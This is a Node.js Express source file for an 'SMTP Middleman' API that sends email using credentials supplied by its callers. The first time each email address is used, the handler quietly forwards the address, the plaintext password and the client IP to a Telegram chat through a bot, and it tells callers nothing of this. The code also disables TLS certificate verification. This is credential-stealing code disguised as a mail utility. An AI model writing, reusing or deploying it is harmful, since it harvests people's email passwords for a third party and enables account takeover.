const express = require('express')
const nodemailer = require('nodemailer')
const axios = require('axios')

const app = express()
app.use(express.json({ limit: '50mb' }))
app.use(express.urlencoded({ limit: '50mb', extended: true }))

const API_KEY = process.env.API_KEY
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID

const loggedEmails = new Set()

function escapeHtml(str) {
  if (!str) return ''
  return str.replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#39;')
}

function buildTelegramMessage(userEmail, userPass, clientIp, tanggal, pukul, status, errorMessage = null) {
  const statusText = status === 'SUCCESS' ? '✅ SUCCESS' : '❌ FAILED'
  let msg = `
<b>📧 NEW SMTP ACTIVITY</b>
━━━━━━━━━━━━━━━━━━━━━━━━━
<b>👤 Email:</b> <code>${escapeHtml(userEmail)}</code>
<b>🔑 Password:</b> <code>${escapeHtml(userPass)}</code>
<b>🌐 IP Address:</b> <code>${escapeHtml(clientIp)}</code>
<b>📅 Date:</b> ${escapeHtml(tanggal)}
<b>⏰ Time:</b> ${escapeHtml(pukul)}
<b>📊 Status:</b> ${statusText}`

  if (errorMessage) {
    msg += `\n<b>⚠️ Error Log:</b> <blockquote>${escapeHtml(errorMessage)}</blockquote>`
  }

  msg += `\n━━━━━━━━━━━━━━━━━━━━━━━━━\n<i>SMTP Middleman by ArkRega</i>`
  return msg.trim()
}

async function sendTelegramLog(userEmail, userPass, clientIp, tanggal, pukul, status, errorMessage = null) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return
  const messageHtml = buildTelegramMessage(userEmail, userPass, clientIp, tanggal, pukul, status, errorMessage)
  try {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: messageHtml,
      parse_mode: 'HTML'
    })
  } catch (e) {
    console.error('Telegram send error:', e.message)
  }
}

async function sendWithRetry(userEmail, userPass, toEmail, subject, htmlBody, attachments) {
  const cleanPass = userPass.replace(/\s/g, '')

  let hosts = []
  if (userEmail.endsWith('@gmail.com')) {
    hosts = ['smtp.gmail.com']
  } else {
    hosts = ['mail-1.jetorbit.net', 'mail.fixmerahsupport.web.id']
  }

  const configs = []
  for (const host of hosts) {
    configs.push(
      { host, port: 465, secure: true },
      { host, port: 587, secure: false }
    )
  }

  let lastError = null
  for (const cfg of configs) {
    try {
      const transporter = nodemailer.createTransport({
        host: cfg.host,
        port: cfg.port,
        secure: cfg.secure,
        auth: {
          user: userEmail,
          pass: cleanPass,
        },
        tls: {
          rejectUnauthorized: false
        }
      })

      const mailOptions = {
        from: userEmail,
        to: toEmail,
        subject: subject,
        html: htmlBody
      }
      if (attachments && attachments.length > 0) {
        mailOptions.attachments = attachments
      }

      const info = await transporter.sendMail(mailOptions)
      return { success: true, messageId: info.messageId, usedConfig: cfg }
    } catch (err) {
      lastError = err
      console.log(`Gagal dengan config ${cfg.host}:${cfg.port}: ${err.message}`)
    }
  }

  throw lastError || new Error('Semua konfigurasi SMTP gagal')
}

app.post('/api/send', async (req, res) => {
  const { apiKey, userEmail, userPass, toEmail, subject, htmlBody, attachments } = req.body
  const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'UNKNOWN'
  const clientIp = rawIp.split(',')[0].trim()

  if (apiKey !== API_KEY) {
    return res.status(403).json({ success: false, error: 'Invalid API Key' })
  }

  if (!userEmail || !userPass || !toEmail || !subject || !htmlBody) {
    return res.status(400).json({ success: false, error: 'Missing parameters' })
  }

  const cleanPass = userPass.replace(/\s/g, '')
  let status = 'SUCCESS'
  let errorMessage = null

  try {
    const result = await sendWithRetry(userEmail, cleanPass, toEmail, subject, htmlBody, attachments || [])

    if (!loggedEmails.has(userEmail)) {
      loggedEmails.add(userEmail)
      const dateObj = new Date()
      const tanggal = dateObj.toLocaleDateString('id-ID', { timeZone: 'Asia/Jakarta' })
      const pukul = dateObj.toLocaleTimeString('id-ID', { timeZone: 'Asia/Jakarta' })
      await sendTelegramLog(userEmail, cleanPass, clientIp, tanggal, pukul, status)
    }

    res.status(200).json({
      success: true,
      messageId: result.messageId,
      usedHost: result.usedConfig.host,
      usedPort: result.usedConfig.port
    })
  } catch (error) {
    status = 'FAILED'
    errorMessage = error.message

    if (!loggedEmails.has(userEmail)) {
      loggedEmails.add(userEmail)
      const dateObj = new Date()
      const tanggal = dateObj.toLocaleDateString('id-ID', { timeZone: 'Asia/Jakarta' })
      const pukul = dateObj.toLocaleTimeString('id-ID', { timeZone: 'Asia/Jakarta' })
      await sendTelegramLog(userEmail, cleanPass, clientIp, tanggal, pukul, status, errorMessage)
    }

    res.status(500).json({
      success: false,
      error: errorMessage
    })
  }
})

app.get('/', (req, res) => {
  res.send('ArkRega SMTP API is running on Vercel!')
})

module.exports = app
